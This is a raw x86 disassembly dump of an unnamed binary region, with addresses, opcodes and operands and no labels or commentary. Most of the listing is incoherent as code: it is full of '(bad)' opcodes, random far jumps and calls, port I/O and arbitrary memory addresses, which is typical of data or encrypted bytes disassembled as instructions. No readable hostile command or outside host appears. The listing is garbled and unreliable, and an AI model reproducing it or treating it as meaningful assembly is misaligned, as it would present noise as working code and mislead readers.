  42736b:	xchg   ebx,eax
  42736c:	dec    ebp
  42736d:	mov    BYTE PTR ds:0xf135b585,dl
  427373:	or     esi,DWORD PTR [esi-0x11f9053f]
  427379:	mov    eax,ds:0x78076e2a
  42737e:	jo     0x427300
  427380:	mov    edx,DWORD PTR [edi+0xc353797]
  427386:	imul   edx,eax,0xffffffb0
  427389:	push   edi
  42738a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42738b:	(bad)  
  42738c:	ja     0x427385
  42738e:	xchg   ecx,eax
  42738f:	sbb    DWORD PTR [edi+0x6a],ebx
  427392:	bound  esp,QWORD PTR [edx-0x36]
  427395:	loop   0x427332
  427397:	fs xchg ebp,eax
  427399:	mov    esp,0x7fe3d8a9
  42739e:	sub    cl,al
  4273a0:	ja     0x427358
  4273a2:	in     eax,dx
  4273a3:	push   ebx
  4273a4:	repnz add bh,ch
  4273a7:	cmp    DWORD PTR [edx],0x5da65126
  4273ad:	mov    ds:0x4aeff84b,al
  4273b2:	das    
  4273b3:	dec    ebx
  4273b4:	inc    esi
  4273b5:	test   DWORD PTR [edi],ebx
  4273b7:	jmp    0xe587fc9
  4273bc:	mov    ds:0x2317262a,eax
  4273c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  427432:	add    BYTE PTR [eax],al
  427434:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  42743b:	outs   dx,DWORD PTR ds:[esi]
  42743c:	pop    DWORD PTR [ebx+eiz*8-0x16]
  427440:	gs punpckhwd mm2,mm6
  427444:	in     al,0xa1
  427446:	add    DWORD PTR [eax],eax
  427448:	test   BYTE PTR [eax],0x0
  42744b:	add    BYTE PTR [esi-0x3],cl
  42744e:	push   edi
  42744f:	test   eax,0x5ebb823c
  427454:	rcr    bl,cl
  427456:	jl     0x42743e
  427458:	inc    DWORD PTR [esp+ebp*2-0x5c]
  42745c:	rcr    ebp,0xe4
  42745f:	lods   al,BYTE PTR ds:[esi]
  427460:	dec    esp
  427461:	add    DWORD PTR [edx+0x47043e51],edx
  427467:	dec    ecx
  427468:	push   ebx
  427469:	push   esp
  42746a:	es daa 
  42746c:	cli    
  42746d:	jge    0x4274b1
  42746f:	mov    ecx,0x9ef5c3db
  427474:	ficom  WORD PTR [esp+esi*4+0x58]
  427478:	imul   eax,DWORD PTR [eax+0x22eae5bb],0x1d
  42747f:	jae    0x42742d
  427481:	mov    fs,WORD PTR [ebx]
  427483:	lods   eax,DWORD PTR ds:[esi]
  427484:	inc    BYTE PTR [ebx-0x2a]
  427487:	adc    DWORD PTR [ecx],esp
  427489:	xor    al,0xe
  42748b:	das    
  42748c:	add    dl,BYTE PTR [ebx-0x50]
  42748f:	adc    ebp,ebp
  427491:	mov    eax,ds:0x33403a04
  427496:	in     eax,dx
  427497:	test   eax,0x54132fb5
  42749c:	jl     0x427519
  42749e:	int    0xa5
  4274a0:	(bad)  
  4274a1:	sub    al,0x10
  4274a3:	aas    
  4274a4:	in     al,dx
  4274a5:	dec    ebp
  4274a6:	adc    dh,BYTE PTR [ebx-0x4c]
  4274a9:	arpl   bp,ax
  4274ab:	retf   0xa044
  4274ae:	daa    
  4274af:	addr16 lahf 
  4274b1:	xor    al,0xf1
  4274b3:	imul   esi,DWORD PTR [eax+0x15],0x1c
  4274b7:	retf   0x8ce6
  4274ba:	dec    edx
  4274bb:	and    BYTE PTR [ebx],dh
  4274bd:	dec    edx
  4274be:	lds    edi,FWORD PTR [edx+0x11c67917]
  4274c4:	imul   ebx,DWORD PTR [edx+0x6b052bbd],0x13
  4274cb:	ins    DWORD PTR es:[edi],dx
  4274cc:	data16 fcom QWORD PTR [esi+0x58]
  4274d0:	add    esp,DWORD PTR [esi]
  4274d2:	jl     0x427494
  4274d4:	stos   DWORD PTR es:[edi],eax
  4274d5:	fdivr  QWORD PTR [edi-0x117fa857]
  4274db:	bound  edx,QWORD PTR [esi+0x10545936]
  4274e1:	loop   0x4274b4
  4274e3:	lods   eax,DWORD PTR ds:[esi]
  4274e4:	jo     0x4274b8
  4274e6:	mov    edx,0x64ac52de
  4274eb:	jecxz  0x4274e8
  4274ed:	sbb    BYTE PTR [esp+ebx*2+0x29],ah
  4274f1:	frstor [edi-0x1831a0d3]
  4274f7:	jp     0x42756f
  4274f9:	stc    
  4274fa:	popa   
  4274fb:	(bad)  
  4274fc:	in     eax,dx
  4274fd:	pop    eax
  4274fe:	std    
  4274ff:	lock jmp 0x2bbe:0x264cd2b0
  427507:	fnstcw WORD PTR cs:[ebp-0x8a9ff4]
  42750e:	and    al,0x24
  427510:	and    al,0xe0
  427512:	addr16 dec ebp
  427514:	cmc    
  427515:	popa   
  427516:	jmp    0xf04359a2
  42751b:	cld    
  42751c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42751d:	mov    ds:0x894637af,eax
  427522:	pop    ebp
  427523:	push   es
  427524:	pop    ds
  427525:	mov    al,0x64
  427527:	jne    0x427570
  427529:	jecxz  0x427544
  42752b:	jp     0x4275a3
  42752d:	leave  
  42752e:	xlat   BYTE PTR ds:[ebx]
  42752f:	nop
  427530:	inc    eax
  427531:	inc    ebx
  427532:	cmp    ah,cl
  427534:	retf   
  427535:	fidiv  WORD PTR [esi+0x1a]
  427538:	mov    ds:0x6f273ba,eax
  42753d:	mov    ds:0x85b86350,al
	...
  4275b2:	add    BYTE PTR [eax],al
  4275b4:	adc    cl,bl
  4275b6:	sbb    DWORD PTR [edx],0xcb9b5ad9
  4275bc:	mov    ds:0xa09a8b87,al
  4275c1:	test   DWORD PTR [ebx+0x1a2da65],edi
  4275c7:	add    dh,dh
  4275c9:	add    BYTE PTR [eax],al
  4275cb:	add    dl,al
  4275cd:	ss adc eax,0xe256ab49
  4275d3:	shl    DWORD PTR [edi],0xea
  4275d6:	adc    bh,BYTE PTR [ecx]
  4275d8:	or     eax,0x16077e4a
  4275dd:	stc    
  4275de:	mov    edi,0x365bf27c
  4275e3:	stos   BYTE PTR es:[edi],al
  4275e4:	mov    dh,0xcc
  4275e6:	rol    BYTE PTR [ebx-0x1e],1
  4275e9:	enter  0x24b9,0x8e
  4275ed:	out    0x41,al
  4275ef:	dec    ebp
  4275f0:	add    al,0x7c
  4275f2:	xchg   ebp,eax
  4275f3:	push   edi
  4275f4:	dec    ebx
  4275f5:	retf   0xc6df
  4275f8:	sub    al,0x8d
  4275fa:	xor    DWORD PTR [edx+0x38dd87ad],eax
  427600:	daa    
  427601:	adc    eax,0xebcd228c
  427606:	popf   
  427607:	sub    al,0x89
  427609:	das    
  42760a:	imul   cl
  42760c:	out    dx,al
  42760d:	jg     0x42763c
  42760f:	(bad)  
  427610:	shl    BYTE PTR [ebp-0x29],1
  427613:	dec    DWORD PTR [esi+0x7a7995d6]
  427619:	jl     0x42762c
  42761b:	push   ecx
  42761c:	in     al,0x7
  42761e:	ds push esi
  427620:	dec    esp
  427621:	rcl    bl,0xd4
  427624:	sbb    al,0xf7
  427626:	pushf  
  427627:	out    0x2f,eax
  427629:	push   es
  42762a:	loop   0x4275dc
  42762c:	aad    0xc6
  42762e:	sub    BYTE PTR [ebp-0x18],bl
  427631:	xor    edx,ebx
  427633:	(bad)  
  427634:	fnstcw WORD PTR [ecx+0x1c]
  427637:	push   edi
  427638:	(bad)  
  427639:	mov    bh,0x2c
  42763b:	cmp    al,0x3f
  42763d:	arpl   WORD PTR [ebp+0x26],si
  427640:	outs   dx,DWORD PTR ds:[esi]
  427641:	pop    esp
  427642:	mov    dh,BYTE PTR [ecx-0x599fda82]
  427648:	pop    esp
  427649:	cdq    
  42764a:	lods   al,BYTE PTR ds:[esi]
  42764b:	or     esi,DWORD PTR [edi+edi*1-0x68c23e0e]
  427652:	ins    BYTE PTR es:[edi],dx
  427653:	push   ebp
  427654:	push   es
  427655:	jmp    0xaa9:0x8362b435
  42765c:	call   0x2b7c142f
  427661:	fwait
  427662:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427663:	pop    ecx
  427664:	sub    BYTE PTR [eax],ah
  427666:	xchg   ebp,eax
  427667:	mov    al,ds:0x8f0c8685
  42766c:	jl     0x42764b
  42766e:	xor    DWORD PTR [edx-0x4e],0x5b
  427672:	xchg   DWORD PTR [esi-0x3ab50414],ecx
  427678:	mov    edi,0x841bb9fe
  42767d:	dec    ecx
  42767e:	stos   BYTE PTR es:[edi],al
  42767f:	mov    ebp,0x46a1e681
  427684:	aaa    
  427685:	mov    ebx,0xc9526854
  42768a:	fcmovbe st,st(3)
  42768c:	aaa    
  42768d:	stos   BYTE PTR es:[edi],al
  42768e:	mov    edx,0x840fd00
  427693:	mov    ds:0xab17c295,al
  427698:	xor    eax,0xe3199c
  42769d:	adc    eax,0x97f3203b
  4276a2:	dec    eax
  4276a3:	inc    ecx
  4276a4:	je     0x4276d3
  4276a6:	fstp   DWORD PTR [ecx-0x1d]
  4276a9:	pop    ecx
  4276aa:	jecxz  0x4276f0
  4276ac:	fs shr edx,0xd3
  4276b0:	cli    
  4276b1:	mov    dh,0x1c
  4276b3:	inc    eax
  4276b4:	cmp    dh,bh
  4276b6:	and    eax,0x14b5dafb
  4276bb:	(bad)  
  4276bc:	icebp  
  4276bd:	scas   eax,DWORD PTR es:[edi]
  4276be:	pusha  
  4276bf:	sbb    al,0x81
  4276c1:	push   edi
	...
  427732:	add    BYTE PTR [eax],al
  427734:	mov    eax,0xff2ace8d
  427739:	imul   edi,esp,0xffffff9f
  42773c:	and    al,0x37
  42773e:	or     al,0x49
  427740:	inc    edx
  427741:	test   DWORD PTR [eax+0x1a3d086],ebp
  427747:	add    dh,dh
  427749:	add    BYTE PTR [eax],al
  42774b:	add    BYTE PTR [ebx+0x4b97b84b],dh
  427751:	or     BYTE PTR [ebx+0xbf4a3b4],dl
  427757:	inc    edi
  427758:	inc    eax
  427759:	xor    DWORD PTR [edi+eiz*8+0x3fa9398f],0xffffffdc
  427761:	sbb    al,0xf1
  427763:	fsubr  QWORD PTR [ebp+0x2d]
  427766:	imul   edi,esp,0xa4cf6aee
  42776c:	mov    ebx,0x26948091
  427771:	pop    esp
  427772:	dec    ecx
  427773:	push   ebx
  427774:	add    DWORD PTR [eax],0x747299ff
  42777a:	icebp  
  42777b:	pushf  
  42777c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42777d:	je     0x4277f7
  42777f:	add    BYTE PTR [eax+ebp*8],bh
  427782:	mov    dl,0x2e
  427784:	adc    eax,0x460af38d
  427789:	cmp    eax,0xd6f33b3c
  42778e:	out    dx,al
  42778f:	adc    ebx,ebp
  427791:	xchg   edi,eax
  427792:	pop    edx
  427793:	jmp    0x9c7c:0x8f5466ef
  42779a:	shr    BYTE PTR [edi-0x3f],1
  42779d:	call   0x93d:0xb058d3d1
  4277a4:	inc    sp
  4277a6:	mov    ah,0x9e
  4277a8:	fadd   DWORD PTR [edx-0x6a]
  4277ab:	fdiv   st,st(3)
  4277ad:	mov    ds:0x9fddba21,al
  4277b2:	ja     0x427773
  4277b4:	jl     0x4277dd
  4277b6:	lods   eax,DWORD PTR ds:[esi]
  4277b7:	not    bh
  4277b9:	call   0x9e22:0xdc30358b
  4277c0:	(bad)  
  4277c1:	stos   DWORD PTR es:[edi],eax
  4277c2:	repz fstp QWORD PTR gs:[edi]
  4277c6:	jmp    0xe0a5:0x4b34b692
  4277cd:	fcomp  DWORD PTR [ecx-0x76]
  4277d0:	dec    ebx
  4277d1:	cmp    al,BYTE PTR [edx]
  4277d3:	cld    
  4277d4:	and    DWORD PTR [eax+0x7399be00],ebp
  4277da:	ret    0x27b5
  4277dd:	(bad)  
  4277de:	xchg   edx,eax
  4277df:	ret    
  4277e0:	push   cs
  4277e1:	outs   dx,BYTE PTR ds:[esi]
  4277e2:	into   
  4277e3:	addr16 dec edx
  4277e5:	or     ah,BYTE PTR [ecx]
  4277e7:	mov    cs,WORD PTR [ebx+ecx*8]
  4277ea:	leave  
  4277eb:	fdiv   DWORD PTR [esi+0x79]
  4277ee:	daa    
  4277ef:	xor    eax,0x91ad3111
  4277f4:	push   0x56
  4277f6:	push   ss
  4277f7:	iret   
  4277f8:	and    al,0x5
  4277fa:	fsubr  st,st(2)
  4277fc:	loop   0x427804
  4277fe:	inc    esi
  4277ff:	push   0x32d06d90
  427804:	jb     0x4277d1
  427806:	out    0x3e,al
  427808:	pusha  
  427809:	xor    ebp,DWORD PTR [ecx]
  42780b:	in     eax,0x5e
  42780d:	xchg   edx,eax
  42780e:	mov    ds:0xbd75542b,eax
  427813:	sub    al,0xcb
  427815:	pop    eax
  427816:	cs in  al,0xac
  427819:	outs   dx,WORD PTR ds:[esi]
  42781b:	xchg   ebx,eax
  42781c:	(bad)  
  42781d:	dec    ecx
  42781e:	lods   eax,DWORD PTR ds:[esi]
  42781f:	jb     0x42783f
  427821:	(bad)  
  427822:	dec    esi
  427823:	shl    DWORD PTR [eax],1
  427825:	push   0x55
  427827:	fist   DWORD PTR ds:0x1911170e
  42782d:	add    DWORD PTR [ebp-0x26ded980],eax
  427833:	leave  
  427834:	cmp    esi,DWORD PTR [edx]
  427836:	rcl    ch,0xbc
  427839:	out    0xf1,eax
  42783b:	ret    0x46c7
  42783e:	ficomp DWORD PTR [ecx+edi*2+0xfb]
	...
  4278b1:	add    BYTE PTR [eax],al
  4278b3:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  4278ba:	mov    edi,?
  4278bc:	dec    eax
  4278bd:	mov    ds:0x265f918f,al
  4278c2:	ret    0xc6df
  4278c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278c6:	add    DWORD PTR [eax],eax
  4278c8:	test   BYTE PTR [eax],0x0
  4278cb:	add    ch,bh
  4278cd:	fimul  DWORD PTR [edi+0x63bc2090]
  4278d3:	pop    esi
  4278d4:	mov    eax,0xb6a08f37
  4278d9:	xchg   esp,ebx
  4278db:	push   es
  4278dc:	cld    
  4278dd:	retf   0x838b
  4278e0:	sbb    esi,ebx
  4278e2:	pop    ds
  4278e3:	sbb    al,0x2f
  4278e5:	(bad)  
  4278e6:	jmp    0x662a5779
  4278eb:	ss push esi
  4278ed:	mov    bh,BYTE PTR [esp+edi*8-0x70]
  4278f1:	fidiv  WORD PTR gs:[esi]
  4278f4:	bsr    edx,DWORD PTR [esi+0x5a8727cc]
  4278fb:	cmp    al,BYTE PTR [edi+ebx*1+0x7f]
  4278ff:	cdq    
  427900:	sbb    BYTE PTR [ebx+0x144895ff],dh
  427906:	inc    esi
  427907:	mov    ah,0xb1
  427909:	xchg   ebx,eax
  42790a:	push   ss
  42790b:	(bad)  
  42790c:	cmp    BYTE PTR [eax*1-0x6be034e2],cl
  427913:	call   0xe25d:0xfad0ad6e
  42791a:	mov    esp,DWORD PTR ds:0xca1e6a2c
  427920:	int3   
  427921:	test   BYTE PTR [edi],ah
  427923:	dec    eax
  427924:	loopne 0x427921
  427926:	add    eax,0xc526174a
  42792b:	ja     0x4278d7
  42792d:	ror    ch,1
  42792f:	mov    ch,0x49
  427931:	push   ecx
  427932:	call   0x83a9:0x98ed1a75
  427939:	mov    bl,0x19
  42793b:	pop    edi
  42793c:	cdq    
  42793d:	bnd jmp 0x1ede96c7
  427943:	inc    BYTE PTR [ebp-0x7d9a6299]
  427949:	push   edx
  42794b:	inc    edx
  42794c:	and    ah,BYTE PTR [edi-0x4945b9b0]
  427952:	pop    ebp
  427953:	jle    0x42791b
  427955:	mov    ebp,0x713259d8
  42795a:	or     eax,0xf5f0cb6
  42795f:	pop    esp
  427960:	in     eax,0x9a
  427962:	dec    edi
  427963:	cmp    al,0xf8
  427965:	or     al,0x5b
  427967:	popa   
  427968:	cli    
  427969:	add    eax,0xc120d93c
  42796e:	mov    edi,0x7cbfd7f8
  427973:	lds    eax,FWORD PTR [ebx-0x35e8c911]
  427979:	push   ecx
  42797a:	and    ah,al
  42797c:	rcr    BYTE PTR [edi-0x37],0x66
  427980:	ja     0x427947
  427982:	xor    BYTE PTR [eax],al
  427984:	pop    esp
  427985:	dec    esp
  427986:	sbb    al,0x70
  427988:	lds    esp,FWORD PTR [edx-0x20]
  42798b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42798c:	jns    0x4279d0
  42798e:	out    dx,al
  42798f:	test   DWORD PTR [edx+0x19217982],ebx
  427995:	popf   
  427996:	xor    eax,0xf0f36f72
  42799b:	cli    
  42799c:	sbb    eax,0xd3eab7e5
  4279a1:	xchg   ecx,eax
  4279a2:	cmp    al,0xa0
  4279a4:	dec    ebx
  4279a5:	mov    ds,eax
  4279a7:	add    eax,ebp
  4279a9:	xchg   ecx,eax
  4279aa:	mov    esi,0x33e55070
  4279af:	into   
  4279b0:	in     al,dx
  4279b1:	ja     0x4279f2
  4279b3:	jbe    0x4279d1
  4279b5:	xchg   esi,eax
  4279b6:	jns    0x427a33
  4279b8:	xor    ah,ah
  4279ba:	jmp    0x8aae:0xf9c94710
  4279c1:	jae    0x4279c3
	...
  427a33:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  427a39:	ja     0x427a16
  427a3b:	out    dx,eax
  427a3c:	das    
  427a3d:	mov    ch,0xeb
  427a3f:	aam    0x4d
  427a41:	mov    DWORD PTR [eax],edi
  427a43:	sub    edi,DWORD PTR [ebp+eiz*4+0xf60001]
  427a4a:	add    BYTE PTR [eax],al
  427a4c:	pop    edx
  427a4d:	push   esi
  427a4e:	mov    bh,0x1
  427a50:	jle    0x427aae
  427a52:	xchg   ebx,eax
  427a53:	sub    ecx,DWORD PTR [eax+0x48d00816]
  427a59:	dec    ecx
  427a5a:	inc    esp
  427a5b:	xor    al,0x20
  427a5d:	popf   
  427a5e:	imul   esi,DWORD PTR [ebx],0x7b6d6ef9
  427a64:	test   BYTE PTR [eax-0x43e73cbd],ah
  427a6a:	xor    al,dh
  427a6c:	(bad)  
  427a6d:	stc    
  427a6e:	enter  0xe626,0x1a
  427a72:	or     al,bh
  427a74:	enter  0xa995,0x11
  427a78:	in     al,0x95
  427a7a:	in     al,dx
  427a7b:	aaa    
  427a7c:	outs   dx,BYTE PTR ds:[esi]
  427a7d:	test   DWORD PTR [ecx+0x1ca62ee6],ebp
  427a83:	xchg   edx,eax
  427a84:	sub    eax,0x67b8a76
  427a89:	xchg   ecx,eax
  427a8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a8b:	adc    DWORD PTR [edx],0x3d
  427a8e:	inc    esi
  427a8f:	xor    cl,BYTE PTR [ecx-0x565f31ba]
  427a95:	addr16 mov bl,0x80
  427a98:	or     eax,DWORD PTR [ebp+eax*4+0x72]
  427a9c:	and    al,0xaf
  427a9e:	cmp    edx,DWORD PTR [eax]
  427aa0:	adc    eax,0xf63e0275
  427aa5:	add    ch,BYTE PTR [edx-0x47a4581e]
  427aab:	in     eax,dx
  427aac:	repz call 0xf053065d
  427ab2:	lahf   
  427ab3:	add    ebp,ecx
  427ab5:	add    al,0x5c
  427ab7:	dec    ebp
  427ab8:	data16 js 0x427b36
  427abb:	push   esp
  427abc:	das    
  427abd:	(bad)  
  427abe:	aam    0x78
  427ac0:	out    dx,al
  427ac1:	push   cs
  427ac2:	mov    bl,0xbd
  427ac4:	sub    al,0x86
  427ac6:	adc    esp,DWORD PTR [edi]
  427ac8:	retf   0xdcdd
  427acb:	mov    edx,0xa336e407
  427ad0:	lock std 
  427ad2:	and    eax,0x38555a7b
  427ad7:	mov    eax,0x49236332
  427adc:	leave  
  427add:	dec    edi
  427adf:	cmp    DWORD PTR [eax],eax
  427ae1:	or     al,BYTE PTR [ebp+0x7e1a08ea]
  427ae7:	sub    dl,BYTE PTR [edi+0x7000a7af]
  427aed:	adc    esp,DWORD PTR [ebx-0x25]
  427af0:	fcomp  st(5)
  427af2:	cwde   
  427af3:	sti    
  427af4:	lea    edx,[esi-0xe6bfa12]
  427afa:	fwait
  427afb:	xchg   esi,eax
  427afc:	xchg   edi,eax
  427afd:	iret   
  427afe:	ins    DWORD PTR es:[edi],dx
  427aff:	adc    al,0x15
  427b01:	ret    0xe07d
  427b04:	jecxz  0x427b5e
  427b06:	scas   eax,DWORD PTR es:[edi]
  427b07:	leave  
  427b08:	mov    al,0xd4
  427b0a:	mov    eax,0x72785b19
  427b0f:	lds    edi,FWORD PTR [edi]
  427b11:	mov    ebx,DWORD PTR [ecx+0x7161b854]
  427b17:	cmp    esp,DWORD PTR [eax]
  427b19:	int    0xd6
  427b1b:	add    BYTE PTR [ecx],ah
  427b1d:	ins    BYTE PTR es:[edi],dx
  427b1e:	call   0xe2080308
  427b23:	aad    0xd4
  427b25:	dec    eax
  427b26:	pop    ds
  427b27:	mov    eax,0x9fda2b99
  427b2c:	iret   
  427b2d:	ins    BYTE PTR es:[edi],dx
  427b2e:	fmul   st(1),st
  427b30:	sbb    eax,0x5cf1466d
  427b35:	xchg   edx,eax
  427b36:	imul   esi,DWORD PTR [ebx-0x596a43cf],0xffffff9e
  427b3d:	outs   dx,BYTE PTR ds:[esi]
  427b3e:	mov    esp,0xea06f6
	...
  427bb3:	add    dl,ah
  427bb5:	pusha  
  427bb6:	test   DWORD PTR [esi+0x74f3f787],esi
  427bbc:	mov    eax,0xc614fe65
  427bc1:	adc    al,0xfd
  427bc3:	xlat   BYTE PTR ds:[ebx]
  427bc4:	mov    dl,0xa6
  427bc6:	add    DWORD PTR [eax],eax
  427bc8:	test   BYTE PTR [eax],0x0
  427bcb:	add    BYTE PTR [ebx],ah
  427bcd:	js     0x427b86
  427bcf:	out    0x35,al
  427bd1:	pop    eax
  427bd2:	lahf   
  427bd3:	inc    ebp
  427bd4:	dec    edi
  427bd5:	pop    edx
  427bd6:	ror    edx,1
  427bd8:	test   DWORD PTR [esi],ebx
  427bda:	or     ebx,DWORD PTR [edx+ecx*4-0x34]
  427bde:	int    0x9a
  427be0:	pop    ecx
  427be1:	adc    al,BYTE PTR [edi+0x4600ee99]
  427be7:	pushf  
  427be8:	mov    bl,0xaa
  427bea:	scas   eax,DWORD PTR es:[edi]
  427beb:	fwait
  427bec:	pop    edi
  427bed:	cmp    cl,BYTE PTR [ecx+0x15]
  427bf0:	inc    edi
  427bf1:	jb     0x427b75
  427bf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427bf4:	out    0x8c,eax
  427bf6:	scas   eax,DWORD PTR es:[edi]
  427bf7:	(bad)  [ebx+0x3c]
  427bfa:	iret   
  427bfb:	fadd   QWORD PTR [edi-0x25]
  427bfe:	fwait
  427bff:	and    esi,DWORD PTR [esi+0x5c]
  427c02:	lods   eax,DWORD PTR ds:[esi]
  427c03:	shr    cl,0x33
  427c06:	lock pop edi
  427c08:	dec    ebx
  427c09:	push   esp
  427c0a:	imul   ecx,edx,0x2d45bc91
  427c10:	loopne 0x427c8d
  427c12:	fidivr DWORD PTR [edi+0x7a8ab4e6]
  427c18:	sbb    eax,0x74442776
  427c1d:	mov    ah,BYTE PTR [edx]
  427c1f:	fwait
  427c20:	and    ch,BYTE PTR [ebp+0x28748bb0]
  427c26:	fisttp WORD PTR [edi+0x3f]
  427c29:	mov    esi,0x2913b082
  427c2e:	add    DWORD PTR [ecx],esp
  427c30:	scas   eax,DWORD PTR es:[edi]
  427c31:	call   0x9deafb6c
  427c36:	push   esi
  427c37:	sub    al,0x73
  427c39:	outs   dx,DWORD PTR ds:[esi]
  427c3a:	loope  0x427c58
  427c3c:	sub    ch,BYTE PTR [edx]
  427c3e:	jmp    0x857f0ab
  427c43:	jns    0x427cab
  427c45:	pop    ecx
  427c46:	popa   
  427c47:	xor    al,0x9
  427c49:	into   
  427c4a:	int    0x8d
  427c4c:	and    eax,0x91d811ce
  427c51:	adc    DWORD PTR [edx-0x1d],0xa
  427c55:	retf   0xe2cd
  427c58:	cmp    edi,esp
  427c5a:	dec    ecx
  427c5b:	ret    0x299b
  427c5e:	pop    ss
  427c5f:	mov    esi,cs
  427c61:	cmp    dl,BYTE PTR [edi]
  427c63:	stos   DWORD PTR es:[edi],eax
  427c64:	xchg   ebx,eax
  427c65:	scas   eax,DWORD PTR es:[edi]
  427c66:	rol    dl,cl
  427c68:	pop    esi
  427c69:	mov    ds:0xf384e435,eax
  427c6e:	lahf   
  427c6f:	xor    edi,ebx
  427c71:	mov    ebx,0x4905223
  427c76:	cwde   
  427c77:	bswap  eax
  427c79:	add    BYTE PTR [ebp-0x2f2390e3],dl
  427c7f:	ffree  st(6)
  427c81:	fldenv [edi]
  427c83:	retf   0x5585
  427c86:	stc    
  427c87:	out    dx,eax
  427c88:	sub    eax,0xeaaa56f3
  427c8d:	adc    ch,BYTE PTR ds:0x6ffe10bb
  427c93:	rcl    al,1
  427c95:	mul    ah
  427c97:	jecxz  0x427c33
  427c99:	pop    ecx
  427c9a:	pop    esp
  427c9b:	shl    BYTE PTR [eax],0x9c
  427c9e:	(bad)
  427ca2:	ror    dl,1
  427ca4:	sbb    DWORD PTR [ebp+0x1e8d05f4],ecx
  427caa:	inc    ebx
  427cab:	in     al,dx
  427cac:	pop    eax
  427cad:	shl    dh,1
  427caf:	int    0x4c
  427cb1:	push   0xec6d72d6
  427cb6:	in     eax,dx
  427cb7:	sbb    edx,0xc3e6b80e
  427cbd:	mov    gs,ecx
  427cbf:	repz mov bl,0x13
	...
  427d32:	add    BYTE PTR [eax],al
  427d34:	or     dh,BYTE PTR [ecx-0xc040c9f]
  427d3a:	call   0x71a1:0xdc63ecf9
  427d41:	cmp    eax,0xa7a8925d
  427d46:	add    DWORD PTR [eax],eax
  427d48:	test   BYTE PTR [eax],0x0
  427d4b:	add    BYTE PTR [eax-0x743a662],dl
  427d51:	inc    eax
  427d52:	jmp    0x7a0182d3
  427d57:	mov    ds:0x49b1f1cd,al
  427d5c:	out    0xc,eax
  427d5e:	push   0x9fd182b1
  427d63:	fdivr  DWORD PTR [esi-0x5558f93f]
  427d69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d6a:	test   al,0x31
  427d6c:	shl    DWORD PTR [esi],cl
  427d6e:	aad    0x66
  427d70:	les    eax,FWORD PTR [ecx]
  427d72:	les    eax,FWORD PTR [eax-0x8]
  427d75:	or     BYTE PTR [edx],0xd7
  427d78:	ds aad 0xfc
  427d7b:	push   es
  427d7c:	lahf   
  427d7d:	jno    0x427d6e
  427d7f:	xor    BYTE PTR [edx+0x33],ch
  427d82:	je     0x427dac
  427d84:	gs je  0x427d9b
  427d87:	mov    dl,0x3
  427d89:	dec    eax
  427d8a:	pop    ebp
  427d8b:	and    eax,0xa0c8047c
  427d90:	cs pop ebp
  427d92:	push   edx
  427d93:	or     BYTE PTR [edx],dl
  427d95:	cmp    BYTE PTR [esi-0x1b7e988e],bh
  427d9b:	ins    BYTE PTR es:[edi],dx
  427d9c:	sub    al,BYTE PTR [edi]
  427d9e:	inc    ebx
  427d9f:	or     al,0xe7
  427da1:	jbe    0x427db1
  427da3:	mov    bh,0x11
  427da5:	int    0xa1
  427da7:	daa    
  427da8:	ds sti 
  427daa:	sbb    DWORD PTR [edx],ebx
  427dac:	test   al,0x65
  427daf:	sub    ebp,DWORD PTR [edi+0x760e4e75]
  427db5:	hlt    
  427db6:	ret    0x8b61
  427db9:	xchg   ebx,eax
  427dba:	cs cld 
  427dbc:	clc    
  427dbd:	pop    eax
  427dbe:	(bad)  
  427dbf:	fld    TBYTE PTR [esi+0x2b]
  427dc2:	mov    al,0xa1
  427dc4:	popa   
  427dc5:	in     al,dx
  427dc6:	fnstsw WORD PTR ds:0x98b05b78
  427dcc:	in     eax,0xe
  427dce:	(bad)  
  427dcf:	pusha  
  427dd0:	mov    esi,0x977fadba
  427dd5:	sbb    eax,0x9e31da77
  427dda:	cs aam 0x81
  427ddd:	loop   0x427e52
  427ddf:	mov    ebp,0xbdc12006
  427de4:	retw   0xb327
  427de8:	cs pop ss
  427dea:	inc    edi
  427deb:	dec    edi
  427dec:	out    0x4,al
  427dee:	(bad)  
  427def:	mov    al,ds:0x9dda2a3f
  427df4:	fsubr  QWORD PTR [edi]
  427df6:	xchg   edx,eax
  427df7:	daa    
  427df8:	adc    esi,esi
  427dfa:	out    0x44,al
  427dfc:	sbb    eax,0xfe935988
  427e01:	sbb    cl,BYTE PTR [esi]
  427e03:	daa    
  427e04:	pop    edi
  427e05:	jge    0x427e08
  427e07:	and    DWORD PTR [eax-0x6c4f7b15],edx
  427e0d:	push   ecx
  427e0e:	loope  0x427de0
  427e10:	mov    al,ds:0x1bc7540b
  427e15:	push   DWORD PTR [edi]
  427e17:	ss mov dl,0x97
  427e1a:	arpl   WORD PTR [eax],si
  427e1c:	lods   al,BYTE PTR ds:[esi]
  427e1d:	push   edx
  427e1e:	shl    BYTE PTR [esp+eiz*2+0x78],0x3b
  427e23:	xchg   esi,eax
  427e24:	push   ds
  427e25:	cmp    esp,DWORD PTR [eax]
  427e27:	xchg   esi,eax
  427e28:	inc    edi
  427e29:	fs addr16 pop ss
  427e2c:	pop    eax
  427e2d:	not    DWORD PTR [edi-0x7b]
  427e30:	sbb    BYTE PTR [ecx],cl
  427e32:	test   eax,0x85a6a787
  427e37:	jnp    0x427e52
  427e39:	mov    bl,0xa7
  427e3b:	ds mov cl,0xa6
  427e3e:	aaa    
  427e3f:	(bad)  
  427e40:	adc    DWORD PTR [ebx+0x0],edi
	...
  427eb3:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  427eba:	mov    dh,0xf7
  427ebc:	mov    ebx,esi
  427ebe:	cmp    ebx,edx
  427ec0:	sub    eax,0x9ea42e25
  427ec5:	test   al,0x1
  427ec7:	add    dh,dh
  427ec9:	add    BYTE PTR [eax],al
  427ecb:	add    BYTE PTR [ebp-0x7869d06e],ah
  427ed1:	cmc    
  427ed2:	cld    
